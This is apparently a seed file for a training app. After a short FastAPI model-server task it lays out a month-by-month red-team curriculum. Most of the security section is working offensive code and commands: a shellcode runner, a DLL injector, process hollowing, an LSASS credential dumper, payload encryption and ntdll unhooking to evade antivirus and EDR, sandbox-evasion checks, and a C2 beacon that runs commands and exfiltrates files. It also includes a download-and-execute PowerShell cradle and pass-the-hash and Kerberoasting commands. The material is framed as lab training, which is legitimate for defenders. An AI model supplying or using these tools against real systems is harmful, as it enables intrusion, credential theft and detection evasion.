\`\`\`python
from sentence_transformers import SentenceTransformer

embed_model = SentenceTransformer('all-MiniLM-L6-v2')

@app.post("/embeddings")
async def embeddings(texts: list[str]):
    embeddings = embed_model.encode(texts)
    return {"embeddings": embeddings.tolist()}
\`\`\`

## Run Server
\`\`\`bash
uvicorn server:app --host 0.0.0.0 --port 8000
\`\`\`

## Test with curl
\`\`\`bash
# Generate
curl -X POST http://localhost:8000/generate \\
    -H "Content-Type: application/json" \\
    -d '{"prompt": "Hello, how are you?", "max_tokens": 100}'

# Streaming
curl -X POST http://localhost:8000/generate \\
    -H "Content-Type: application/json" \\
    -d '{"prompt": "Tell me a story", "stream": true}'
\`\`\`

## Benchmark
\`\`\`python
import time
import requests

prompts = ["Hello"] * 100
start = time.time()
for p in prompts:
    requests.post("http://localhost:8000/generate", json={"prompt": p})
elapsed = time.time() - start

print(f"Throughput: {100/elapsed:.1f} requests/sec")
\`\`\`

## Completion Criteria
- [ ] Server running with quantized model
- [ ] /generate endpoint works (with streaming)
- [ ] /embeddings endpoint works
- [ ] Benchmarked latency and throughput`]
];

projectTasks.forEach(([title, desc, details], i) => {
	insertTask.run(aiMod5.lastInsertRowid, title, desc, details, i, now);
});

// ============================================================================
// Security / Red Team Path
// ============================================================================
const secPath = insertPath.run(
	'Red Team & Offensive Security',
	'Learn malware development, Active Directory attacks, and evasion techniques. Build custom tooling for authorized security testing.',
	'rose',
	now
);

// Month 1: Foundations
const secMod1 = insertModule.run(
	secPath.lastInsertRowid,
	'Month 1: Foundations',
	'Windows internals, C basics, and AD fundamentals',
	0,
	now
);

const secFoundationTasks: [string, string, string][] = [
	['Learn Windows API basics',
	'Master the core Windows APIs used for process and memory manipulation.',
	`## Core APIs to Learn

### Process APIs
\`\`\`c
// Create new process
CreateProcess(NULL, "cmd.exe", ...);

// Open existing process
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
\`\`\`

### Memory APIs
\`\`\`c
// Allocate in current process
void* mem = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);

// Allocate in remote process
void* rmem = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT, PAGE_READWRITE);

// Write to remote process
WriteProcessMemory(hProc, rmem, buffer, size, NULL);
\`\`\`

### Thread APIs
\`\`\`c
// Create thread in remote process
CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
\`\`\`

## Practice Exercise
Write a C program that:
1. Allocates RWX memory
2. Writes shellcode bytes to it
3. Executes by casting to function pointer

## Resources
- MSDN documentation for each function
- Windows Internals book (Russinovich)

## Completion Criteria
- [ ] Can explain what each API does
- [ ] Wrote simple program using these APIs
- [ ] Tested in Windows VM`],

	['Understand PE file format',
	'Learn the Portable Executable format used by Windows executables.',
	`## PE Structure
\`\`\`
┌─────────────────────────┐
│ DOS Header (MZ)         │ ← "MZ" magic bytes
├─────────────────────────┤
│ DOS Stub                │ ← "This program cannot..."
├─────────────────────────┤
│ PE Header               │ ← "PE\\0\\0" magic
├─────────────────────────┤
│ Optional Header         │ ← Entry point, image base
├─────────────────────────┤
│ Section Headers         │ ← .text, .data, .rdata info
├─────────────────────────┤
│ .text section           │ ← Executable code
├─────────────────────────┤
│ .data section           │ ← Read/write data
├─────────────────────────┤
│ .rdata section          │ ← Imports, exports, strings
└─────────────────────────┘
\`\`\`

## Key Fields
- **Entry Point:** Where execution begins
- **Image Base:** Preferred load address
- **Import Table:** DLLs and functions used
- **Export Table:** Functions this PE provides

## Tools to Use
- **PE-bear:** Visual PE editor
- **CFF Explorer:** Detailed PE analysis
- **pefile (Python):** Programmatic access

## Why It Matters
- Loaders parse PE to execute programs
- Packers modify PE to hide code
- AV scans PE for signatures
- You'll modify PEs for injection

## Reference
https://corkami.github.io/pics/

## Completion Criteria
- [ ] Can identify major PE sections
- [ ] Used PE-bear to examine an exe
- [ ] Understand imports vs exports`],

	['Study how AV/EDR detection works',
	'Understand the detection layers you need to evade.',
	`## Detection Layers

### 1. Signature Detection (Static)
- Hash matching on files
- Byte patterns (YARA rules)
- String matching
- **Bypass:** Modify bytes, encrypt payload

### 2. Heuristic Analysis
- Suspicious API sequences
- Entropy analysis (packed files)
- Import table analysis
- **Bypass:** Indirect calls, obfuscation

### 3. Behavioral Detection
- Process creation monitoring
- File system activity
- Network connections
- **Bypass:** Blend with normal behavior

### 4. Userland Hooks
EDR patches ntdll.dll to intercept API calls:
\`\`\`
Your code → kernel32.dll → ntdll.dll (HOOKED!) → syscall
\`\`\`
**Bypass:** Direct syscalls, unhooking

### 5. Kernel Callbacks
OS notifies EDR of events:
- PsSetCreateProcessNotifyRoutine
- PsSetLoadImageNotifyRoutine
**Bypass:** Much harder, need kernel tricks

### 6. ETW (Event Tracing)
Telemetry from:
- .NET CLR
- PowerShell
- Syscall tracing
**Bypass:** Patch ETW functions

## Study Resources
- Elastic's detection rules (open source)
- AV vendor whitepapers

## Completion Criteria
- [ ] Can explain each detection layer
- [ ] Know basic bypass for each
- [ ] Understand hook placement in ntdll`],

	['Write basic shellcode runner in C',
	'Create a simple program that executes shellcode in memory.',
	`## Step 1: Generate Shellcode
\`\`\`bash
msfvenom -p windows/x64/exec CMD=calc.exe -f c
\`\`\`

## Step 2: Write Runner
\`\`\`c
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] =
    "\\xfc\\x48\\x83\\xe4\\xf0..."  // from msfvenom

int main() {
    // Allocate RWX memory
    void* exec = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (exec == NULL) {
        printf("VirtualAlloc failed\\n");
        return 1;
    }

    // Copy shellcode
    memcpy(exec, shellcode, sizeof(shellcode));

    // Execute
    ((void(*)())exec)();

    return 0;
}
\`\`\`

## Step 3: Compile
\`\`\`bash
# MinGW
x86_64-w64-mingw32-gcc runner.c -o runner.exe

# Visual Studio
cl runner.c
\`\`\`

## Step 4: Test in VM
- Run in isolated Windows VM
- Should pop calculator
- Observe in Process Monitor

## Important Notes
- PAGE_EXECUTE_READWRITE is suspicious
- Modern approach: RW → memcpy → RX
- This WILL trigger AV without obfuscation

## Completion Criteria
- [ ] Generated shellcode with msfvenom
- [ ] Compiled and ran in VM
- [ ] Calculator popped successfully`],

	['Build DLL injector',
	'Inject a custom DLL into a running process.',
	`## The Technique
\`\`\`
1. Open target process
2. Allocate memory in target
3. Write DLL path to that memory
4. Create thread calling LoadLibrary
\`\`\`

## Step 1: Create Test DLL
\`\`\`c
// inject.c
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        MessageBox(NULL, "Injected!", "DLL", MB_OK);
    }
    return TRUE;
}
\`\`\`

## Step 2: Build Injector
\`\`\`c
#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("Usage: inject.exe <pid> <dll_path>\\n");
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    char* dllPath = argv[2];
    size_t pathLen = strlen(dllPath) + 1;

    // Open target process
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    // Allocate memory in target
    void* remoteMem = VirtualAllocEx(hProc, NULL, pathLen,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Write DLL path
    WriteProcessMemory(hProc, remoteMem, dllPath, pathLen, NULL);

    // Get LoadLibraryA address (same in all processes)
    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
    void* loadLibAddr = GetProcAddress(hKernel32, "LoadLibraryA");

    // Create remote thread
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)loadLibAddr, remoteMem, 0, NULL);

    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    CloseHandle(hProc);

    return 0;
}
\`\`\`

## Step 3: Test
\`\`\`bash
# Open notepad, get PID from Task Manager
inject.exe 1234 C:\\full\\path\\to\\inject.dll
\`\`\`

## Verification
- MessageBox should appear
- Process Explorer: see DLL loaded in notepad

## Completion Criteria
- [ ] Created test DLL with MessageBox
- [ ] Built working injector
- [ ] Successfully injected into notepad`],

	['Implement process hollowing',
	'Replace a legitimate process with your own code.',
	`## Overview
Create a legitimate-looking process, hollow out its memory, inject your code.

## Steps
1. CreateProcess with CREATE_SUSPENDED
2. Unmap the original executable
3. Allocate new memory at image base
4. Write your PE (headers + sections)
5. Update thread context (entry point)
6. Resume thread

## Implementation Outline
\`\`\`c
// 1. Create suspended process
STARTUPINFO si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcess(NULL, "C:\\\\Windows\\\\System32\\\\svchost.exe",
    NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// 2. Get thread context (contains registers)
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(pi.hThread, &ctx);

// 3. Read PEB to find image base
// 4. Unmap original image (NtUnmapViewOfSection)
// 5. Allocate at original image base
// 6. Write headers and sections
// 7. Update entry point in context
ctx.Rcx = newEntryPoint;
SetThreadContext(pi.hThread, &ctx);

// 8. Resume
ResumeThread(pi.hThread);
\`\`\`

## Resources
- https://github.com/m0n0ph1/Process-Hollowing
- "Process Hollowing and PE Image Relocations" article

## Detection
- Memory regions don't match on-disk image
- Modified PEB fields
- Suspicious parent-child relationships

## Completion Criteria
- [ ] Understand the full hollowing flow
- [ ] Studied reference implementation
- [ ] Created working PoC in lab`],

	['Set up vulnerable AD home lab',
	'Build a realistic Active Directory environment for attack practice.',
	`## Hardware Requirements
- RAM: 32GB minimum (64GB recommended)
- CPU: 8+ cores
- Storage: 200GB+ SSD

## Network Diagram
\`\`\`
┌─────────────────────────────────────────┐
│              LAB.LOCAL Domain           │
├─────────────────────────────────────────┤
│                                         │
│  DC01 (10.0.0.10)     WS01 (10.0.0.20) │
│  Windows Server 2022   Windows 10       │
│  Domain Controller     Workstation      │
│                                         │
│  WS02 (10.0.0.21)     KALI (10.0.0.100)│
│  Windows 11           Attacker          │
│  Workstation                            │
│                                         │
└─────────────────────────────────────────┘
\`\`\`

## Setup Steps

### 1. Domain Controller
- Install Windows Server 2022
- Add AD DS role
- Create forest: lab.local
- Configure DNS

### 2. Create Users
\`\`\`powershell
New-ADUser -Name "Admin User" -SamAccountName admin
New-ADUser -Name "Help Desk" -SamAccountName helpdesk
New-ADUser -Name "SQL Service" -SamAccountName svc_sql
New-ADUser -Name "Regular User" -SamAccountName user1
\`\`\`

### 3. Create Groups
\`\`\`powershell
Add-ADGroupMember -Identity "Domain Admins" -Members admin
\`\`\`

### 4. Join Workstations
- Set DNS to DC IP
- Join to lab.local domain

### 5. Snapshot!
Save clean state before adding vulnerabilities.

## Automation Options
- GOAD: https://github.com/Orange-Cyberdefense/GOAD
- ADsimulator: Auto-generates vulnerable AD

## Completion Criteria
- [ ] DC running with AD DS
- [ ] 2+ workstations joined
- [ ] Users and groups created
- [ ] Clean snapshot saved`],

	['Learn AD architecture',
	'Understand Active Directory structure and core concepts.',
	`## Core Concepts

### Domain
- Security boundary
- Contains users, computers, groups
- Has its own policies (GPOs)

### Forest
- Collection of domains with trust
- Share schema and global catalog
- Enterprise Admins span entire forest

### Organizational Unit (OU)
- Container for organizing objects
- GPOs apply to OUs
- Delegation of administration

### Group Policy Object (GPO)
- Settings pushed to computers/users
- Password policies, software installs, scripts
- Linked to OUs, domains, sites

## Key Objects

### Users
- SamAccountName: login name
- UserPrincipalName: user@domain.com
- SID: unique identifier

### Computers
- Also have accounts!
- Machine account: COMPUTER$
- Can have SPNs, delegations

### Groups
- **Domain Admins:** Admin on all domain machines
- **Enterprise Admins:** Admin on entire forest
- **Administrators:** Local on specific machine

## Protocols

### LDAP
Query and modify directory:
\`\`\`
ldapsearch -H ldap://DC01 -b "dc=lab,dc=local" "(objectClass=user)"
\`\`\`

### DNS
Service location via SRV records:
\`\`\`
_ldap._tcp.dc._msdcs.lab.local
\`\`\`

## Completion Criteria
- [ ] Can explain domain vs forest
- [ ] Know key group memberships
- [ ] Understand LDAP basics`],

	['Understand Kerberos auth flow',
	'Learn the Kerberos authentication protocol used in AD.',
	`## The Flow (Draw This!)
\`\`\`
┌──────────┐         ┌──────────┐         ┌──────────┐
│  Client  │         │   KDC    │         │ Service  │
└────┬─────┘         └────┬─────┘         └────┬─────┘
     │                    │                    │
     │ 1. AS-REQ          │                    │
     │ "I'm user X"       │                    │
     │───────────────────>│                    │
     │                    │                    │
     │ 2. AS-REP          │                    │
     │ TGT (encrypted     │                    │
     │ with krbtgt hash)  │                    │
     │<───────────────────│                    │
     │                    │                    │
     │ 3. TGS-REQ         │                    │
     │ "Give me ticket    │                    │
     │  for service Y"    │                    │
     │───────────────────>│                    │
     │                    │                    │
     │ 4. TGS-REP         │                    │
     │ Service ticket     │                    │
     │ (encrypted with    │                    │
     │  service hash)     │                    │
     │<───────────────────│                    │
     │                    │                    │
     │ 5. AP-REQ                               │
     │ "Here's my ticket"                      │
     │────────────────────────────────────────>│
     │                                         │
\`\`\`

## Key Components

### TGT (Ticket Granting Ticket)
- Encrypted with krbtgt hash
- Contains user info and PAC
- Used to request service tickets

### Service Ticket
- Encrypted with service account hash
- Allows access to specific service
- Contains PAC with group memberships

### PAC (Privilege Attribute Certificate)
- User's SID
- Group memberships
- Used for authorization

## Attack Implications
- **Kerberoasting:** Request service tickets, crack offline
- **Golden Ticket:** Forge TGT with krbtgt hash
- **Silver Ticket:** Forge service ticket with service hash

## Completion Criteria
- [ ] Can draw the Kerberos flow
- [ ] Understand TGT vs Service Ticket
- [ ] Know what PAC contains`],

	['Understand NTLM authentication',
	'Learn the NTLM challenge-response protocol.',
	`## The Flow
\`\`\`
┌──────────┐                    ┌──────────┐
│  Client  │                    │  Server  │
└────┬─────┘                    └────┬─────┘
     │                               │
     │ 1. NEGOTIATE                  │
     │ "I want to authenticate"      │
     │──────────────────────────────>│
     │                               │
     │ 2. CHALLENGE                  │
     │ 16-byte random challenge      │
     │<──────────────────────────────│
     │                               │
     │ 3. RESPONSE                   │
     │ HMAC-MD5(challenge, NT hash)  │
     │──────────────────────────────>│
     │                               │
     │        Server verifies        │
     │        against DC             │
     │                               │
\`\`\`

## NTLMv2 Response Calculation
\`\`\`
NT hash = MD4(password)
Response = HMAC-MD5(challenge + blob, NT hash)
\`\`\`

## Vulnerabilities

### Pass-the-Hash
- Don't need password, just the hash
- Hash used directly in authentication
\`\`\`bash
impacket-psexec -hashes :NTHASH domain/user@target
\`\`\`

### NTLM Relay
- Forward authentication to another service
- Attacker in the middle
\`\`\`bash
ntlmrelayx.py -t smb://target
\`\`\`

## When NTLM is Used
- Legacy systems
- When Kerberos fails (DNS issues)
- Cross-forest authentication
- Workgroup environments

## Completion Criteria
- [ ] Understand challenge-response
- [ ] Know how Pass-the-Hash works
- [ ] Know when NTLM is used`],

	['Map domain with PowerView',
	'Use PowerView to enumerate Active Directory.',
	`## Setup
\`\`\`powershell
# Download and import
IEX(New-Object Net.WebClient).DownloadString(
    'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1'
)
\`\`\`

## Essential Commands

### Users
\`\`\`powershell
# All users
Get-DomainUser | select samaccountname

# Specific user details
Get-DomainUser -Identity admin

# Users with SPNs (Kerberoastable)
Get-DomainUser -SPN
\`\`\`

### Groups
\`\`\`powershell
# Domain Admins
Get-DomainGroup -Identity "Domain Admins" | Get-DomainGroupMember

# All groups for a user
Get-DomainGroup -MemberIdentity admin
\`\`\`

### Computers
\`\`\`powershell
# All computers
Get-DomainComputer | select name

# Unconstrained delegation
Get-DomainComputer -TrustedToAuth
\`\`\`

### ACLs
\`\`\`powershell
# Who can modify admin?
Get-ObjectAcl -Identity admin -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl"}
\`\`\`

### Local Admin Access
\`\`\`powershell
# Where am I local admin?
Find-LocalAdminAccess
\`\`\`

## Quick Recon Script
\`\`\`powershell
# Run this for quick overview
Get-DomainUser -SPN | select samaccountname  # Kerberoastable
Get-DomainUser -PreauthNotRequired            # AS-REP roastable
Get-DomainComputer -TrustedToAuth             # Delegation
Find-LocalAdminAccess                          # Where we're admin
\`\`\`

## Completion Criteria
- [ ] Imported PowerView in lab
- [ ] Enumerated users and groups
- [ ] Found Kerberoastable accounts`],

	['Create common misconfigurations',
	'Set up vulnerable configurations in your lab to practice attacks.',
	`## 1. Kerberoastable Account
Service account with weak password and SPN:
\`\`\`powershell
# Create user
New-ADUser -Name "SQL Service" -SamAccountName svc_sql \\
    -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) \\
    -Enabled $true

# Add SPN
setspn -A MSSQLSvc/db01.lab.local:1433 svc_sql
\`\`\`

## 2. AS-REP Roastable Account
User without pre-authentication:
\`\`\`powershell
Set-ADAccountControl -Identity asrep_user -DoesNotRequirePreAuth $true
\`\`\`

## 3. Unconstrained Delegation
Computer that can impersonate anyone:
\`\`\`powershell
Set-ADComputer -Identity WS01 -TrustedForDelegation $true
\`\`\`

## 4. Weak ACLs
User with GenericAll on another user:
\`\`\`powershell
$user = Get-ADUser attacker
$targetDN = (Get-ADUser victim).DistinguishedName
$acl = Get-Acl "AD:\\$targetDN"
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule \\
    $user.SID, "GenericAll", "Allow"
$acl.AddAccessRule($ace)
Set-Acl "AD:\\$targetDN" $acl
\`\`\`

## 5. Local Admin Everywhere
Add domain user to local admins:
\`\`\`powershell
# On each workstation
Add-LocalGroupMember -Group "Administrators" -Member "LAB\\helpdesk"
\`\`\`

## Verification
After setup, use PowerView to confirm:
\`\`\`powershell
Get-DomainUser -SPN          # Should show svc_sql
Get-DomainUser -PreauthNotRequired  # Should show asrep_user
Get-DomainComputer -TrustedToAuth   # Should show WS01
\`\`\`

## Completion Criteria
- [ ] Created all 5 misconfigurations
- [ ] Verified with PowerView
- [ ] Ready for attack practice`]
];

secFoundationTasks.forEach(([title, desc, details], i) => {
	insertTask.run(secMod1.lastInsertRowid, title, desc, details, i, now);
});

// Month 2: Core Techniques
const secMod2 = insertModule.run(
	secPath.lastInsertRowid,
	'Month 2: Core Techniques',
	'Custom tooling and AD attack paths',
	1,
	now
);

const secCoreTasks: [string, string, string][] = [
	['Build custom credential dumper', 'Create a tool to dump credentials from LSASS memory.', `## Why Custom?
Mimikatz signature is burned by every AV. You need your own implementation.

## Methods
1. **MiniDumpWriteDump** - Create dump file, parse offline
2. **Direct memory read** - ReadProcessMemory on LSASS
3. **Syscalls** - Avoid EDR hooks

## Implementation Approach
\`\`\`c
// Open LSASS
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsass_pid);

// Create dump
MiniDumpWriteDump(hProc, lsass_pid, hFile, MiniDumpWithFullMemory, ...);
\`\`\`

## Offline Parsing
\`\`\`bash
pypykatz lsa minidump lsass.dmp
\`\`\`

## Completion Criteria
- [ ] Dumped LSASS without triggering Defender
- [ ] Parsed credentials from dump`],

	['Implement XOR encryption for payloads', 'Add basic XOR obfuscation to evade static signatures.', `## XOR Encryption
Simplest obfuscation that defeats static signature scans.

## Implementation
\`\`\`c
void xor_encrypt(unsigned char* data, size_t len, char* key, size_t keylen) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key[i % keylen];
    }
}

// Usage
unsigned char shellcode[] = {...};
char key[] = "secretkey123";
xor_encrypt(shellcode, sizeof(shellcode), key, strlen(key));
// Now shellcode is encrypted

// At runtime, decrypt before execution
xor_encrypt(shellcode, sizeof(shellcode), key, strlen(key));
\`\`\`

## Key Management
- Use unique key per build
- Key in binary is extractable but raises the bar
- Consider deriving key from environment

## Testing
- Encrypt payload
- Scan with AV - should not flag
- Decrypt and execute - should work

## Completion Criteria
- [ ] Encrypted payload passes AV scan
- [ ] Decrypts correctly at runtime`],

	['Implement AES encryption with key derivation', 'Add strong encryption with dynamic key derivation.', `## Why AES?
XOR is weak - professional analysis can break it. AES is cryptographically strong.

## Key Derivation Options
Don't hardcode the key directly:
1. **Environment:** hostname + username hash
2. **C2:** Fetch key from server
3. **PBKDF2:** Derive from compile-time secret

## Windows CryptoAPI Example
\`\`\`c
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")

// Key derivation from password
BCryptDeriveKeyPBKDF2(hAlg, password, len, salt, saltLen, 10000, key, keyLen, 0);

// Encryption
BCryptEncrypt(hKey, plaintext, len, NULL, iv, 16, ciphertext, len, &result, 0);
\`\`\`

## Best Practices
- Never write decrypted payload to disk
- Key should not be easily extractable
- Consider different keys per target

## Completion Criteria
- [ ] Implemented AES encryption/decryption
- [ ] Key derived from environment
- [ ] Payload decrypts correctly in memory`],

	['Learn direct syscalls', 'Bypass EDR hooks by calling syscalls directly.', `## The Problem
\`\`\`
Your code → kernel32.dll → ntdll.dll (HOOKED!) → syscall → kernel
\`\`\`
EDR places hooks in ntdll.dll to monitor API calls.

## The Solution
\`\`\`
Your code → syscall instruction directly → kernel
\`\`\`

## Syscall Numbers (SSN)
Each NT function has a number. Windows 10 examples:
- NtAllocateVirtualMemory: 0x18
- NtWriteVirtualMemory: 0x3A
- NtCreateThreadEx: 0xC1

## Implementation
\`\`\`asm
NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, 18h        ; syscall number
    syscall
    ret
NtAllocateVirtualMemory ENDP
\`\`\`

## Tools
- **SysWhispers:** Generates syscall stubs
- **HellsGate:** Dynamically resolves SSNs

## Completion Criteria
- [ ] Understand why direct syscalls bypass hooks
- [ ] Implemented NtAllocateVirtualMemory via syscall
- [ ] Tested against hooked environment`],

	['Implement ntdll unhooking', 'Restore clean ntdll.dll to bypass EDR hooks.', `## The Technique
1. Read clean ntdll.dll from disk
2. Map it into memory
3. Copy clean .text section over hooked one

## Detection: Is Function Hooked?
\`\`\`c
// Clean function starts with:
// mov r10, rcx
// mov eax, <SSN>

// Hooked function starts with:
// jmp <EDR address>

BYTE* func = GetProcAddress(GetModuleHandle("ntdll"), "NtAllocateVirtualMemory");
if (func[0] == 0xE9 || func[0] == 0xFF) {
    printf("Function is hooked!\\n");
}
\`\`\`

## Unhooking Implementation
\`\`\`c
// 1. Map clean ntdll from disk
HANDLE hFile = CreateFile("C:\\\\Windows\\\\System32\\\\ntdll.dll", ...);
HANDLE hMap = CreateFileMapping(hFile, ...);
LPVOID clean = MapViewOfFile(hMap, ...);

// 2. Find .text section
// 3. Copy clean bytes over hooked ones
memcpy(hooked_ntdll_text, clean_ntdll_text, text_size);
\`\`\`

## Completion Criteria
- [ ] Can detect hooked functions
- [ ] Successfully unhook ntdll
- [ ] API calls bypass EDR after unhooking`],

	['Add delayed execution', 'Evade sandbox analysis with execution delays.', `## Why Delay?
Sandboxes have limited runtime (30s-5min). Wait them out.

## Simple Sleep
\`\`\`c
Sleep(300000);  // 5 minutes
\`\`\`
Problem: Sandboxes can fast-forward sleep.

## Better: Environment Checks
\`\`\`c
BOOL is_sandbox() {
    // Check uptime (sandboxes just booted)
    if (GetTickCount64() < 10*60*1000) return TRUE;

    // Check RAM (sandboxes have less)
    MEMORYSTATUSEX mem;
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 4LL*1024*1024*1024) return TRUE;

    // Check process count
    // Check for user interaction (mouse movement)

    return FALSE;
}
\`\`\`

## Combine Multiple Checks
More checks = harder to fake all of them.

## Completion Criteria
- [ ] Implemented environment checks
- [ ] Tested in real sandbox
- [ ] Payload evades analysis`],

	['Build basic C2 client', 'Create a command and control beacon.', `## Architecture
\`\`\`
Beacon → HTTP GET /tasks → C2 Server
         ↓
    Execute task
         ↓
Beacon → HTTP POST /results → C2 Server
\`\`\`

## Basic Beacon Loop
\`\`\`c
while (1) {
    // Add jitter to avoid detection
    int jitter = base_sleep * (1 + random(-0.2, 0.2));
    Sleep(jitter);

    // Check for tasks
    char* response = http_get(c2_server, "/tasks");
    if (response) {
        char* result = execute_task(response);
        http_post(c2_server, "/results", result);
    }
}
\`\`\`

## Jitter
Randomize sleep time to avoid predictable beacon intervals:
\`\`\`
base = 60 seconds
jitter = ±20%
actual = 48-72 seconds
\`\`\`

## Best Practices
- Use HTTPS
- Legitimate User-Agent
- Consider domain fronting

## Completion Criteria
- [ ] Beacon checks in regularly
- [ ] Receives and executes commands
- [ ] Returns results to C2`],

	['Add command execution to C2', 'Execute arbitrary commands via your C2 client.', `## Approach
Receive command from C2, execute, return output.

## Using CreateProcess
\`\`\`c
char* execute_cmd(char* cmd) {
    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    CreatePipe(&hRead, &hWrite, &sa, 0);

    STARTUPINFO si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    PROCESS_INFORMATION pi;
    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    CloseHandle(hWrite);
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Read output
    char buffer[4096];
    DWORD bytesRead;
    ReadFile(hRead, buffer, sizeof(buffer), &bytesRead, NULL);

    return strdup(buffer);
}
\`\`\`

## Advanced Options
- PowerShell execution (without powershell.exe)
- .NET assembly loading (execute C# in memory)
- BOF (Beacon Object Files)

## Completion Criteria
- [ ] Execute commands from C2
- [ ] Return output to C2
- [ ] Handle errors gracefully`],

	['Implement file upload/download', 'Add file transfer capabilities to your C2.', `## Download (Exfiltration)
\`\`\`c
void exfil_file(char* path) {
    // Read file
    FILE* f = fopen(path, "rb");
    fseek(f, 0, SEEK_END);
    size_t size = ftell(f);
    fseek(f, 0, SEEK_SET);

    char* data = malloc(size);
    fread(data, 1, size, f);
    fclose(f);

    // Base64 encode
    char* encoded = base64_encode(data, size);

    // POST to C2
    http_post(c2, "/exfil", encoded);
}
\`\`\`

## Upload (Drop Tool)
\`\`\`c
void download_file(char* url, char* dest) {
    char* data = http_get(c2, url);
    char* decoded = base64_decode(data);

    FILE* f = fopen(dest, "wb");
    fwrite(decoded, 1, decoded_len, f);
    fclose(f);
}
\`\`\`

## Best Practices
- Chunk large files
- Encrypt in transit
- Memory-only loading when possible

## Completion Criteria
- [ ] Exfiltrate files to C2
- [ ] Download tools from C2
- [ ] Handle large files`],

	['Run BloodHound against lab', 'Map attack paths in your AD environment.', `## Setup
\`\`\`bash
# Install Neo4j
apt install neo4j

# Start Neo4j, set password
neo4j console

# Download BloodHound
# https://github.com/BloodHoundAD/BloodHound/releases
\`\`\`

## Collection
\`\`\`powershell
# From Windows
.\\SharpHound.exe -c All

# From Linux
bloodhound-python -u user -p pass -d lab.local -dc dc01.lab.local -c All
\`\`\`

## Import and Query
1. Upload JSON to BloodHound
2. Run queries:
   - "Shortest Path to Domain Admin"
   - "Kerberoastable Users"
   - "Users with DCSync Rights"

## Find Attack Paths
Look for:
- Kerberoastable accounts → crack → DA
- Unconstrained delegation → TGT capture → DA
- Weak ACLs → privilege escalation → DA

## Completion Criteria
- [ ] Collected data with SharpHound
- [ ] Imported into BloodHound
- [ ] Found path to Domain Admin`],

	['Execute Kerberoasting manually', 'Request and crack service tickets without tools.', `## The Attack
Any domain user can request a service ticket for any SPN.
Ticket is encrypted with service account's password hash.
Crack offline → service account password.

## Step 1: Find SPNs
\`\`\`powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
\`\`\`

## Step 2: Request Ticket (Manual)
\`\`\`powershell
Add-Type -AssemblyName System.IdentityModel
$token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken \\
    -ArgumentList "MSSQLSvc/db01.lab.local:1433"
\`\`\`

## Step 3: Export Ticket
\`\`\`powershell
# With Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt

# With Mimikatz
kerberos::list /export
\`\`\`

## Step 4: Crack
\`\`\`bash
hashcat -m 13100 hashes.txt wordlist.txt
\`\`\`

## Completion Criteria
- [ ] Found Kerberoastable account
- [ ] Extracted service ticket
- [ ] Cracked password with hashcat`],

	['Perform Pass-the-Hash without Mimikatz', 'Use NTLM hashes to authenticate.', `## The Attack
Use the hash directly without knowing the password.

## With Impacket (Python)
\`\`\`bash
# Get hash from DCSync, SAM dump, etc.
HASH="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"

# PsExec style
impacket-psexec -hashes $HASH domain/Administrator@target

# WMI
impacket-wmiexec -hashes $HASH domain/Administrator@target

# SMB
impacket-smbexec -hashes $HASH domain/Administrator@target
\`\`\`

## With Rubeus (Overpass-the-Hash)
\`\`\`powershell
Rubeus.exe asktgt /user:Administrator /rc4:<hash> /ptt
\`\`\`

## Custom Implementation
Implement NTLM authentication using hash instead of password.

## Completion Criteria
- [ ] Got shell with hash (no password)
- [ ] Used multiple impacket tools
- [ ] Understand NTLM auth flow`],

	['Abuse unconstrained delegation', 'Capture TGTs from unconstrained delegation machines.', `## The Vulnerability
Unconstrained delegation: machine can impersonate ANY user who authenticates to it.

## Attack Flow
1. Compromise machine with unconstrained delegation
2. Coerce high-privilege user to authenticate
3. Capture their TGT from memory
4. Use TGT to access resources as that user

## Step 1: Find Unconstrained Delegation
\`\`\`powershell
Get-DomainComputer -TrustedToAuth
\`\`\`

## Step 2: Monitor for TGTs
\`\`\`powershell
Rubeus.exe monitor /interval:5 /nowrap
\`\`\`

## Step 3: Coerce Authentication
\`\`\`bash
# PrinterBug (SpoolSample)
SpoolSample.exe DC01 YOURHOST

# PetitPotam
PetitPotam.exe YOURHOST DC01
\`\`\`

## Step 4: Capture and Use TGT
